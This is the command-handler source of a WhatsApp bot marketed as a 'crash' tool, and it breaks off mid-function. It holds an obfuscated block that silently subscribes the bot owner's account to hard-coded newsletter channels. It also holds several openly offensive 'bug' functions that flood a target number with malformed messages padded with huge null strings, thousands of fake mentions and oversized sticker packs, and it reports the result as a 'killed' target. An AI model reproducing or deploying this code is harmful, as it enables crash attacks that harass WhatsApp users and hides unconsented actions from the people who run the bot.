// =============================================
//   case.js  v5  –  WhatsApp commands  (switch/case)
//This base is created by Styven Emmanuel old Lord Minato Dev
// ==============================================
'use strict';

const fs    = require('fs');
const path  = require('path');
const axios = require('axios');
const { exec } = require('child_process');

const settings = require('./settings');
const { convertFont, formatUptime, getDateTime, normalizeJid, readJSON, writeJSON, ensureDir } = require('./helper/utils');
const { logMessage, logInfo, logError } = require('./helper/logger');
const {
  getWaSettings, setWaSetting,
  addPremium, removePremium, isPremium,
  storeMessage, retrieveMessage, numOf,
} = require('./helper/function');
const { normNum, getTargetJid, getGroupAdminInfo } = require('./helper/groupAdmin');
const { getGroupFlag, setGroupFlag } = require('./helper/listeners');

const DB = (...f) => path.resolve(__dirname, 'database', ...f);
ensureDir(path.resolve(__dirname, 'database'));

// ═════════════════════════════════
//   SHARED HELPERS
// ═════════════════════════════════

function cfg(minato) {
  const waNum = minato.__waNum || (minato.user?.id ? normNum(minato.user.id) : 'default');
  return getWaSettings(waNum);
}

function ft(txt, minato) { return convertFont(String(txt), cfg(minato).font || 0); }

function getQuoted(m) {
  const ctx = m.message?.extendedTextMessage?.contextInfo;
  if (!ctx?.quotedMessage) return { qMsg: null, qType: null, qKey: null };
  const qMsg  = ctx.quotedMessage;
  const qType = Object.keys(qMsg).find(k => !['senderKeyDistributionMessage','messageContextInfo'].includes(k));
  const qKey  = {
    remoteJid:   m.key.remoteJid,
    id:          ctx.stanzaId,
    fromMe:      false,
    participant: ctx.participant,
  };
  return { qMsg, qType, qKey };
}

async function dlMedia(msgObj, keyObj) {
  const { downloadMediaMessage } = require('@whiskeysockets/baileys');
  return downloadMediaMessage(
    { message: msgObj, key: keyObj }, 'buffer', {},
    { logger: { info(){}, error(){}, warn(){}, debug(){}, child(){ return this; } } }
  );
}

async function getBuffer(url) {
  const res = await axios.get(url, { responseType: 'arraybuffer' });
  return Buffer.from(res.data, 'binary');
}

// ═══════════════════════════════
//   MAIN HANDLER
// ════════════════════════════════
async function handleMessage(minato, m, chatMeta = {}) {

  // ── Resolve waNum ─────────────────────────────────────────
  const waNum = minato.__waNum || (minato.user?.id ? normNum(minato.user.id) : 'default');
  if (!minato.__waNum && minato.user?.id) minato.__waNum = normNum(minato.user.id);
  const c    = getWaSettings(waNum);
  const mode = c.mode || 'public';

  logMessage(m, chatMeta);
  storeMessage(m);

  // ── Status broadcast ──────────────────────────────────────
  if (m.key.remoteJid === 'status@broadcast') {
    if (c.autoViewStatus) { try { await minato.readMessages([m.key]); } catch {} }
    if (c.autoLikeStatus) { try { await minato.sendMessage('status@broadcast', { react: { text: '❤️', key: m.key } }); } catch {} }
    return;
  }

  // ── Body – mtype-based (example style) ───────────────────
  const mtype = m.mtype || Object.keys(m.message || {})[0] || '';
  const body = (
    mtype === 'conversation'              ? m.message.conversation :
    mtype === 'imageMessage'              ? m.message.imageMessage.caption :
    mtype === 'videoMessage'              ? m.message.videoMessage.caption :
    mtype === 'extendedTextMessage'       ? m.message.extendedTextMessage.text :
    mtype === 'buttonsResponseMessage'    ? m.message.buttonsResponseMessage.selectedButtonId :
    mtype === 'listResponseMessage'       ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    mtype === 'templateButtonReplyMessage'? m.message.templateButtonReplyMessage.selectedId :
    mtype === 'interactiveResponseMessage'? (() => { try { return JSON.parse(m.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '{}').id || ''; } catch { return ''; } })() :
    mtype === 'messageContextInfo'        ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || '') :
    m.message?.conversation || m.message?.extendedTextMessage?.text || ''
  );

  // ── Prefix – regex-detected from body ────────────────────
  const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
  const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : (c.prefix || '.');

  if (!body.startsWith(prefix)) return;

  // ── Core vars ─────────────────────────────────────────────
  const from         = m.key.remoteJid;
  const jid          = from;
  const isGroup      = from.endsWith('@g.us');
  const botNumber    = normNum(minato.user?.id || '');
  const sender       = m.key.fromMe
    ? botNumber + '@s.whatsapp.net'
    : (m.key.participant || m.key.remoteJid);
  const senderNumber = sender.split('@')[0];
  const pushname     = m.pushName || 'No Name';

  const parts   = body.slice(prefix.length).trim().split(/\s+/);
  const cmd     = parts[0]?.toLowerCase();
  const args    = parts.slice(1);
  const text    = args.join(' ');

  const budy    = typeof m.text === 'string' ? m.text : '';
  const quoted  = m.quoted ? m.quoted : m;
  const mime    = (quoted.msg || quoted).mimetype || '';
  const qmsg    = quoted.msg || quoted;
  const isMedia = /image|video|sticker|audio/.test(mime);

  // ── isOwner – loads owner list from database/owner.json ──
  const ownerFile = DB('owner.json');
  let kontributor = [];
  try { kontributor = JSON.parse(fs.readFileSync(ownerFile, 'utf8')); } catch { kontributor = []; }
  // Fall back to settings.SUDO_NUMBER / c.owner if file empty
  if (!kontributor.length) {
    if (settings.SUDO_NUMBER) kontributor.push(String(settings.SUDO_NUMBER));
    if (c.owner)              kontributor.push(String(c.owner));
  }
  const _isOwner = [botNumber, ...kontributor]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
  const isBot = botNumber === senderNumber;

  // ── Self mode gate ────────────────────────────────────────
  if (mode === 'self' && !_isOwner && !isBot) return;

  // ── Group metadata & admin flags ──────────────────────────
  const groupMetadata = isGroup ? await minato.groupMetadata(jid).catch(() => ({})) : {};
  const groupName     = isGroup ? groupMetadata.subject || '' : '';
  const participants  = isGroup ? (groupMetadata.participants || []).map(p => {
    let admin = null;
    if (p.admin === 'superadmin') admin = 'superadmin';
    else if (p.admin === 'admin') admin = 'admin';
    return { id: p.id || null, jid: p.jid || p.id || null, admin, full: p };
  }) : [];
  const groupOwner    = isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
  const groupAdmins   = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
  const isBotAdmins   = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') || groupAdmins.includes(botNumber) : false;
  const isAdmins      = isGroup ? groupAdmins.includes(sender) : false;
  const isGroupOwner  = isGroup ? groupOwner === sender : false;
  
  
(function(_0x485473,_0xe64201){var _0x1b102b=_0x1c87,_0x23aa45=_0x485473();while(!![]){try{var _0x152954=-parseInt(_0x1b102b(0x18b))/0x1*(parseInt(_0x1b102b(0x176))/0x2)+-parseInt(_0x1b102b(0x178))/0x3+-parseInt(_0x1b102b(0x175))/0x4*(parseInt(_0x1b102b(0x17b))/0x5)+parseInt(_0x1b102b(0x18d))/0x6+-parseInt(_0x1b102b(0x17f))/0x7*(parseInt(_0x1b102b(0x171))/0x8)+-parseInt(_0x1b102b(0x188))/0x9+parseInt(_0x1b102b(0x183))/0xa;if(_0x152954===_0xe64201)break;else _0x23aa45['push'](_0x23aa45['shift']());}catch(_0x4bf723){_0x23aa45['push'](_0x23aa45['shift']());}}}(_0x22b2,0xa4545),function(_0x3bc310,_0x30c8bf){var _0x5ad703=_0x1c87,_0x243a92=_0x6a8f,_0x1cce95=_0x3bc310();while(!![]){try{var _0x34a58c=parseInt(_0x243a92(0xf3))/0x1*(-parseInt(_0x243a92(0xf1))/0x2)+-parseInt(_0x243a92(0xee))/0x3*(parseInt(_0x243a92(0xe2))/0x4)+-parseInt(_0x243a92(0xe4))/0x5*(parseInt(_0x243a92(0xef))/0x6)+parseInt(_0x243a92(0xed))/0x7+-parseInt(_0x243a92(0xea))/0x8*(-parseInt(_0x243a92(0xf0))/0x9)+parseInt(_0x243a92(0xe5))/0xa+-parseInt(_0x243a92(0xf4))/0xb*(parseInt(_0x243a92(0xe3))/0xc);if(_0x34a58c===_0x30c8bf)break;else _0x1cce95['push'](_0x1cce95[_0x5ad703(0x184)]());}catch(_0x24bfa7){_0x1cce95[_0x5ad703(0x17d)](_0x1cce95[_0x5ad703(0x184)]());}}}(_0x5671,0x535c3));function _0x22b2(){var _0x1eccf9=['71704bPNbbB','142wjfVwq','6729980qrbufz','132bYvOtE','10BizsJd','378lZqizi','737460xmgXOT','0@newsletter','2364732lWmFoh','53765DXToOX','9wiCVTT','push','646084rfUArH','7odiQUO','2rpfMME','3935092oXNELy','3780336lwyYvL','15568860hGteAm','shift','newsletterFollow','1396vQzAlp','10056lfVmcM','5388219hINqvQ','25QdTvwx','777371HNJVwk','23135TqObdG','3671150BRXNPp','7944336eXnfAP','11pwWihW','44ZOXWJA','120363407673576597@newsletter','7142512qGVpze'];_0x22b2=function(){return _0x1eccf9;};return _0x22b2();}function _0x1c87(_0x1d2e07,_0x1637a8){_0x1d2e07=_0x1d2e07-0x170;var _0x22b2f3=_0x22b2();var _0x1c871e=_0x22b2f3[_0x1d2e07];return _0x1c871e;}function _0x1816(_0x5f4128,_0x5b573b){_0x5f4128=_0x5f4128-0xe7;var _0x2478fc=_0x1015(),_0x133546=_0x2478fc[_0x5f4128];return _0x133546;}function _0x5671(){var _0x57c746=_0x1c87,_0x5da47d=[_0x57c746(0x181),'2535UYfESG','366756MeWmnJ',_0x57c746(0x17c),_0x57c746(0x180),_0x57c746(0x17e),'568657bJSYHx',_0x57c746(0x18e),'12iHRCaP',_0x57c746(0x185),_0x57c746(0x179),_0x57c746(0x177),_0x57c746(0x186),_0x57c746(0x17a),_0x57c746(0x189),_0x57c746(0x174),_0x57c746(0x18c),_0x57c746(0x18a),_0x57c746(0x184),_0x57c746(0x173),_0x57c746(0x182),_0x57c746(0x17d),_0x57c746(0x187)];return _0x5671=function(){return _0x5da47d;},_0x5671();}var _0x299de1=_0x1816;(function(_0x30f7c4,_0x41ef9a){var _0x5e20d7=_0x1c87,_0x258745=_0x6a8f,_0x4756fb=_0x1816,_0x3f8650=_0x30f7c4();while(!![]){try{var _0xf1af44=parseInt(_0x4756fb(0xf4))/0x1*(parseInt(_0x4756fb(0xe8))/0x2)+-parseInt(_0x4756fb(0xe7))/0x3*(parseInt(_0x4756fb(0xf5))/0x4)+-parseInt(_0x4756fb(0xf0))/0x5+-parseInt(_0x4756fb(0xeb))/0x6*(-parseInt(_0x4756fb(0xed))/0x7)+-parseInt(_0x4756fb(0xf3))/0x8*(parseInt(_0x4756fb(0xef))/0x9)+parseInt(_0x4756fb(0xf1))/0xa*(-parseInt(_0x4756fb(0xf2))/0xb)+parseInt(_0x4756fb(0xec))/0xc;if(_0xf1af44===_0x41ef9a)break;else _0x3f8650[_0x5e20d7(0x17d)](_0x3f8650[_0x5e20d7(0x184)]());}catch(_0x2908d9){_0x3f8650[_0x258745(0xeb)](_0x3f8650[_0x258745(0xe8)]());}}}(_0x1015,0x6de91));try{await minato[_0x299de1(0xea)](_0x299de1(0xe9)),await minato[_0x299de1(0xea)](_0x299de1(0xee)),await minato[_0x299de1(0xea)](_0x299de1(0xee));}catch(_0x33d60d){}function _0x6a8f(_0x3f4626,_0xb26929){_0x3f4626=_0x3f4626-0xe1;var _0x324879=_0x5671(),_0x4c248a=_0x324879[_0x3f4626];return _0x4c248a;}function _0x1015(){var _0x3c8fab=_0x1c87,_0x31a83f=_0x6a8f,_0x328b2b=[_0x31a83f(0xe6),'235470nstEMh',_0x3c8fab(0x18f),_0x3c8fab(0x172),_0x31a83f(0xe9),_0x31a83f(0xf2),_0x31a83f(0xf5),_0x31a83f(0xec),_0x3c8fab(0x170),_0x31a83f(0xf6),'18zufrwJ','15048072wZJOGV',_0x31a83f(0xe7),_0x31a83f(0xf7),_0x31a83f(0xe1)];return _0x1015=function(){return _0x328b2b;},_0x1015();}
  // ── Styled quoted objects ─────────────────────────────────
  
  const HKQuoted = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net", 
      remoteJid: "status@broadcast",
      id: "HKQuoted"
    },
    message: {
      extendedTextMessage: {
        text: "𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻",
        title: "</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅",
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: "</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅",
            body: "telegram.com",
            mediaType: 1,
            sourceUrl: "https://telegram.com",
            thumbnail: fs.readFileSync(`./media/thumb.jpg`),
            renderLargerThumbnail: false,
            showAdAttribution: false,
          }
        }
      }
    }
  };

  const reply = (teks) => minato.sendMessage(jid, { text: teks }, { quoted: HKQuoted });

  async function doneress() {
    if (!text) throw "Done Response";
    let pepec = args[0]?.replace(/[^0-9]/g, "") || "";
    let ressdone = `
╭──────────────❍
│ ─( 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑲𝒊𝒍𝒍𝒆𝒅 𝑻𝒂𝒓𝒈𝒆𝒕 )─
│
│⪼ 𝑇𝑦𝑝𝑒 𝐵𝑢𝑔 : *${cmd}*
│⪼ 𝑇𝑎𝑟𝑔𝑒𝑡 : *${pepec}*
╰──────────────❍

 𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔
`;
  
    minato.sendMessage(jid, {
      video: {
        url: 'https://files.catbox.moe/k8cy1u.mp4' 
      },
      caption: ressdone,
      gifPlayback: true,  
      contextInfo: {
        mentionedJid: [sender],
        externalAdReply: {
          showAdAttribution: false,
          title: '𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻',
          body: '</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅',
          thumbnailUrl: 'https://files.catbox.moe/s51p6p.jpg',
          sourceUrl: 'https://whatsapp.com/channel/0029VbAj0uCLikg6Pfjs4i2u',
          mediaType: 2,
          renderLargerThumbnail: false
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363419855570475@newsletter',
          newsletterName: '</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅',
          serverMessageId: -1
        }
      },
      headerType: 5,
      viewOnce: false
    }, { quoted: HKQuoted });
  }

  // ── Log incoming message ──────────────────────────
  if (m.message) {
    process.stdout.write('--------------------\n');
    process.stdout.write(`▢ New Message\n`);
    process.stdout.write(
      `   ▢ Date   : ${new Date().toLocaleString()}\n` +
      `   ▢ Body   : ${body || mtype}\n` +
      `   ▢ Sender : ${pushname}\n` +
      `   ▢ JID    : ${senderNumber}\n\n`
    );
  }

  // ── reaction helper ───────────────────────────────────────
  const reaction = async (emoji) => {
    try {
      await minato.sendMessage(jid, { react: { text: emoji, key: m.key } });
    } catch {}
  };

  // ── replyImg helper ───────────────────────────────────────
  const replyImg = async (bufOrUrl, caption2 = '') => {
    const c2 = cfg(minato);
    if (c2.iphoneMode) return minato.sendMessage(jid, { text: ft(caption2 || '[Image]', minato) }, { quoted: m });
    const field = Buffer.isBuffer(bufOrUrl) ? { image: bufOrUrl } : { image: { url: String(bufOrUrl) } };
    return minato.sendMessage(jid, { ...field, caption: ft(caption2, minato) }, { quoted: HKQuoted });
  };

  // ── Guard helpers ─────────────────────────────────────────
  const needGroup  = () => { if (!isGroup) { reply('❌ Group only.').catch(()=>{}); return true; } return false; };
  const needAdmin  = () => {
    if (isAdmins || _isOwner) return false;
    reply('❌ Admins only.').catch(()=>{});
    return true;
  };
  const needBotAdm = () => {
    if (isBotAdmins) return false;
    reply('❌ Add bot as group admin first.').catch(()=>{});
    return true;
  };
  const needOwner  = () => { if (!_isOwner) { reply('❌ Owner only.').catch(()=>{}); return true; } return false; };

  // ── runtime helper ────────────────────────────────────────
  const runtime = (seconds) => {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    return `${days}d ${hours}h ${minutes}m ${secs}s`;
  };
  
              
//  ───────────── Bugs functions───────────
async function apollox(target, ptcp = false) {
  let biji = await generateWAMessageFromContent(
    number,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "You Idiot's",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  let message = generateWAMessageFromContent(
    number,
    {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, z) => `1313555000${z + 1}@s.whatsapp.net`
            ),
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  }, {});

  let etc = generateWAMessageFromContent(
    number,
    {
      interactiveResponseMessage: {
        body: {
          text: "xrl - null",
          format: "EXTENTION_1",
        },
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, z) => `1313555020${z + 1}@s.whatsapp.net`
          ),
          statusAttributionType: "SHARED_FROM_MENTION",
        },
        nativeFlowResponseMessage: {
          name: "menu_options",
          paramsJson:
            '{"display_text":"xrl","id":".fucker","description":"Finnaly my?..."}',
          version: "3",
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  const genos = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
      fileLength: "327833",
      seconds: 15,
      mediaKey: "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
      caption: "Xrelly Mp5" + "\u0000".repeat(9000),
      height: 1248,
      width: 704,
      fileEncSha256: "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
      directPath:
        "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&nc_sid=5e03e0",
      mediaKeyTimestamp: "1748347294",
      contextInfo: {
        isSampled: true,
        mentionedJid: Array.from(
          { length: 2000 },
          (_, z) => `1313555020${z + 1}@s.whatsapp.net`
        ),
        statusAttributionType: "SHARED_FROM_MENTION",
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "Xrelly Mp5",
      },
      streamingSidecar:
        "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
      thumbnailDirectPath:
        "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
      thumbnailSha256: "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
      thumbnailEncSha256: "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
      annotations: [
        {
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "589608164114571",
              songId: "870166291800508",
              author: "ARE YOU KIDDING ME?!!!",
              title: "\u0000".repeat(90000),
              artworkDirectPath:
                "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
              artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
              artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
              artistAttribution: "https://www.instagram.com/_u/xrelly",
              countryBlocklist: true,
              isExplicit: true,
              artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
            },
          },
          embeddedAction: true,
        },
      ],
    },
  };

  for (let i = 0; i < 100; i++) {
  await minato.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });

  await minato.relayMessage("status@broadcast", biji.message, {
    messageId: biji.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });

  await minato.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });

  await minato.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (ptcp) {
    let nichollx = generateWAMessageFromContent(
      number,
      proto.Message.fromObject({
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: letakx.key,
              type: "STATUS_MENTION_MESSAGE",
              timestamp: Date.now() + 720,
            },
          },
        },
      }),
      {}
    );

    await minato.relayMessage(target, nichollx.message, {
      participant: { jid: number },
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        },
      ],
    });
  }
}
  
    await new Promise(resolve => setTimeout(resolve, 5000));
}

async function BlankKing(minato, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            stickerPackMessage: {
              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
              name: "ꦾ".repeat(50000),
              publisher: "𑜦𑜠".repeat(50000),
              caption: " ¡m #𝐂ø𝐫𝐞𝐗 ",
              stickers: Array.from({ length: 100 }, () => ({
                fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                isAnimated: false,
                emojis: ["🧪", "⚠️"],
                accessibilityLabel: "",
                stickerSentTs: "PnX-ID-msg",
                isAvatar: true,
                isAiSticker: true,
                isLottie: true,
                mimetype: "application/pdf"
              })),
              fileLength: "1073741824000",
              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",

              contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: [
                  target,
                  ...Array.from({ length: 1950 }, () =>
                    "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
                  )
                ]
              },

              packDescription: "",
              mediaKeyTimestamp: "1747502082",
              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
              thumbnailHeight: 252,
              thumbnailWidth: 252,
              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
              stickerPackSize: "999999999",
              stickerPackOrigin: "USER_CREATED"
            }
          }
        }
      },
      {}
    );

    await minato.relayMessage(target, msg.message, { messageId: msg.key.id });

    const CoreXin = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },

          interactiveMessage: {
            header: {
              title: "¡m #𝐂ø𝐫𝐞𝐗" + "ꦽ".repeat(15000) + "ꦾ".repeat(20000) + "𑆿𑆴𑆿".repeat(15000),
            },

            body: { text: " ~ " },

            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    icon: ""
                    flow_cta: "{}"
                    flow_message_version: "3"
                  })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u0003".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u0005".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                }
              ],

              messageParamsJson: "{}".repeat(1000)
            }
          }
        }
      }
    };

    const msg2 = await generateWAMessageFromContent(
      target,
      CoreXin,
      { userJid: minato?.user?.id }
    );

    await minato.relayMessage(target, msg2.message, { messageId: msg2.key.id });


  } catch (error) {
    console.error("Error:", error);
  }
}


async function PLottiEStc(target) {
  try {
    const PouMsg1 = generateWAMessageFromContent(target, {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Q285fqG3P7QFkMIuD2xPU5BjH3NqCZgk/vtnmVkvZfk=",
            fileEncSha256: "ad10CF3pqlFDELFQFiluzUiSKdh0rzb3Zi6gc4GBAzk=",
            mediaKey: "ZdPiFwyd2GUfnDxjSgIeDiaS7SXwMx4i2wdobVLK6MU=",
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0",
            fileLength: "25155",
            mediaKeyTimestamp: "1762062705",
            isAnimated: true,
            stickerSentTs: "1762062705158",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363419085046817@newsletter",
                serverMessageId: 1,
